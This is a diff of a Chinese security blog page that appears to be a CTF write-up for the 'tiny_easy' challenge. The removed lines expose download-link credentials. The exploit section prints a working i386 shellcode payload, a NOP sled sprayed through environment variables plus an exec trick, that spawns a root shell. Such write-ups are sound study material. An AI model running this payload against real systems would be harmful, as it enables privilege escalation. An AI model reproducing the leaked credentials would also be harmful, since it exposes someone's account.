@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -250,13 +250,12 @@
 <h3 id="利用思路">利用思路</h3>
 <p>远程开启了<code>ASLR</code>，所以需要猜测下栈地址，不过由于是<code>32</code>位，所以猜对的概率还是很大的。远程有<code>python</code>，可以利用<code>python</code>来输入不可见字符。</p>
 <p>这里直接利用环境变量，首先导出足够多的环境变量：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">1</span> 500<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">export</span> RODERICK_<span class="nv">$i</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &#34;\x90&#34;*0x1000+&#34;j1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#34;&#39;</span><span class="k">)</span><span class="p">;</span><span class="k">done</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">1</span> 500<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">export</span> RODERICK_<span class="nv">$i</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &#34;\x90&#34;*0x1000+&#34;j1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#34;&#39;</span><span class="k">)</span><span class="p">;</span><span class="k">done</span><span class="p">;</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>后面的<code>shellcode</code>为：<code>asm(shellcraft.i386.linux.setreuid()+shellcraft.i386.linux.sh())</code></p>
 <ul>
@@ -264,7 +263,7 @@
 <li>多试几次即可获得<code>root shell</code></li>
 </ul>
 <h3 id="exp">EXP</h3>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -273,8 +272,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">1</span> 500<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">export</span> RODERICK_<span class="nv">$i</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &#34;\x90&#34;*0x1000+&#34;j1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#34;&#39;</span><span class="k">)</span><span class="p">;</span><span class="k">done</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s2">&#34;print &#39;\xc0\xc0\xc0\xff&#39;&#34;</span><span class="k">)</span> ./tiny_easy <span class="p">&amp;</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s2">&#34;print &#39;\xc0\xc0\xc0\xff&#39;&#34;</span><span class="k">)</span> ./tiny_easy <span class="p">&amp;</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>打远程：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405141530155.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405141530155.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405141530155.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405141530155.png 2x" sizes="auto" data-title="image-20220405141530155" data-alt="image-20220405141530155" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
